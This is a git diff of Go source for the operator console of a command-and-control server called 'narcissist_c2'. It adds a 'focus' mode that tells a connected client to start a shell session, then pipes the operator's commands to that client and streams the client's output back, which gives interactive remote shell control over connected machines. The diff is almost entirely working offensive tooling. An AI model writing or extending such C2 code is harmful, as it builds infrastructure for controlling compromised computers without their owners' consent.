@@ -2,6 +2,7 @@ package components
 
 import (
 	"bufio"
+	"context"
 	"fmt"
 	"narcissist_c2/server/structs"
 	"narcissist_c2/server/utils"
@@ -11,94 +12,134 @@ import (
 )
 
 var strInput string
+var IptDataCh = make(chan string)
 
 func GetStrIpt() string {
 	return strInput
 }
 
-func HandleInput(channels structs.Channels) {
-	strInput := "broadcast@narcissist_c2 " + utils.GetEmoji("setting")
-	fmt.Println("USER INPUT GOROUTINE STARTED")
-	scanner := bufio.NewScanner(os.Stdin)
-	fmt.Print(strInput)
+var ctx context.Context
+var cancel context.CancelFunc
+var mode string = "normal" // Modes can be "normal" or "shell"
 
-	// Initialiser IOState comme faux (lecture active)
-	IOState := false
+func HandleInput() {
+	strInput = "listener🛰️narcissist_c2 " + utils.GetEmoji("setting")
+	scanner := bufio.NewScanner(os.Stdin)
+	var shellSessionFunc func(string)
 
 	for {
-		// Utiliser select pour écouter à la fois le terminal et le canal
-		select {
-		// Si on reçoit quelque chose dans le canal, on change IOState
-		case newState := <-channels.ClientIptCh:
-			IOState = newState
-			if IOState {
-				fmt.Println("Reader is blocked")
-			} else {
-				fmt.Println("Reader is unblocked")
-				fmt.Print(strInput) // Réaffiche le prompt quand débloqué
-			}
+		if mode == "normal" {
+			fmt.Print(GetStrIpt())
+		}
 
-		// Si IOState est false, on peut lire l'entrée utilisateur
-		default:
-			if !IOState {
-				if scanner.Scan() {
-					cmd := scanner.Text()
-					interpreter(cmd) // Appelle l'interpréteur de commandes
-					fmt.Print(strInput)
-				} else {
-					fmt.Println("Scanner error or input closed")
-					return // Sortir de la boucle si le scanner ne fonctionne plus
-				}
+		if !scanner.Scan() {
+			fmt.Println("Input closed")
+			return
+		}
+		input := scanner.Text()
+		//fmt.Println(mode)
+		switch mode {
+		case "normal":
+			interpreter(input, &mode, &shellSessionFunc)
+		case "shell":
+			if input == "exit" {
+				mode = "normal"
+				break
 			}
+			IptDataCh <- input
+
 		}
 	}
-
 }
 
-func interpreter(cmd string) {
-	splited := strings.SplitN(cmd, " ", -1)
-
-	switch splited[0] {
-	default:
-		fmt.Println(utils.GetEmoji("not_ok") + "Command not found, type <help> for more infos")
-	case "":
-
-	case "help":
-		help()
-	case "exit":
-		os.Exit(0)
+func interpreter(cmd string, mode *string, shellSessionFunc *func(string)) {
+	args := strings.Fields(cmd)
+	if len(args) == 0 {
 		return
-	case "list":
-		if len(splited) < 2 {
-			listClients(GetClients(), false)
-			return
-		}
-		if splited[1] == "all" {
-			listClients(GetClients(), true)
-
-		}
-	case "cmd":
-		if len(splited) < 2 {
-			fmt.Println(utils.GetEmoji("not_ok") + "Missing argument <client-id>. Usage: cmd <client-id>")
-			return
-		}
-
-		SendBroadcast(Clients, splited[1])
-
-	case "focus":
-		if len(splited) < 2 {
-			fmt.Println(utils.GetEmoji("not ok") + "Usage: focus <client-id>")
-			return
-		}
-		cliID, err := strconv.Atoi(splited[1])
-		if err != nil {
-			fmt.Println(utils.GetEmoji("not_ok") + "Invalid client ID")
-			return
-		}
-		go ShellSession(Clients[cliID], IOStateCh)
-		IOStateCh.ClientIptCh <- true
-
 	}
+
+	switch args[0] {
+	case "focus":
+		if len(args) < 2 {
+			fmt.Println("Usage: focus <client-id>")
+			return
+		}
+		clientID, err := strconv.Atoi(args[1])
+		if err != nil {
+			fmt.Println("Invalid client ID")
+			return
+		}
+		fmt.Println(utils.GetEmoji("info") + "Starting shell session.")
+		fmt.Println(utils.GetEmoji("help") + "Tip: type 'exit' to quit the session")
+		*mode = "shell"
+		createShellSession(clientID, mode, shellSessionFunc)
+	case "defocus":
+		*mode = "normal"
+		*shellSessionFunc = nil
+		fmt.Println("Exited shell session")
+	default:
+		fmt.Println("Unknown command")
+	}
+}
+
+func createShellSession(clientID int, mode *string, shellSessionFunc *func(string)) {
+	client, exists := Clients[clientID]
+	if !exists || client.Conn == nil {
+		fmt.Println("Client not found")
+		return
+	}
+	// Optionally, you can print a message when entering shell mode
+	// fmt.Println("Entering shell session. Type 'defocus' to exit.")
+
+	// Start shell session on the client side
+	client.Conn.Write([]byte("{\"type\":\"shell_session\",\"args\":[\"true\"]}\n"))
+	go func() {
+		for data := range DataCh {
+			_, err := os.Stdout.Write(data)
+			if err != nil {
+				fmt.Println("Error writing to stdout:", err)
+
+			}
+
+		}
+
+	}()
+
+	// Start a goroutine to read from the client's connection
+	//	go func() {
+	//		fmt.Println("COPYING")
+	//		n, err := io.Copy(os.Stdout, MultiReader)
+	//		if err != nil {
+	//			fmt.Println("CANT COPY")
+	//			fmt.Println(err)
+	//		}
+	//
+	//		log.Printf("%d", n)
+	//	}()
+
+	go func() {
+		//fmt.Println("WAITING FOR INPUT")
+		for input := range IptDataCh {
+			//fmt.Println("GOT " + " FROM IPTDATACH")
+			write, err := client.Conn.Write([]byte(input + "\n"))
+			if err != nil {
+				fmt.Println(write)
+				print("Error writing to client:", err)
+				return
+			}
+		}
+	}()
+
+	// Return a function that sends commands to the client
+	//return func(input string) {
+	//	if input == "defocus" {
+	//		*mode = "normal"
+	//		*shellSessionFunc = nil
+	//		fmt.Println("Exiting shell session...")
+	//		return
+	//	}
+	//	client.Conn.Write([]byte(input + "\n"))
+	//}
 }
 
 func help() {
@@ -126,4 +167,9 @@ func listClients(clients map[int]structs.Client, listAll bool) {
 		fmt.Println("  " + utils.GetEmoji("user") + strconv.Itoa(client.ID) + " " + client.Address)
 	}
 
+}
+
+func GetChValue(chans chan bool) bool {
+	ch := <-chans
+	return ch
 }
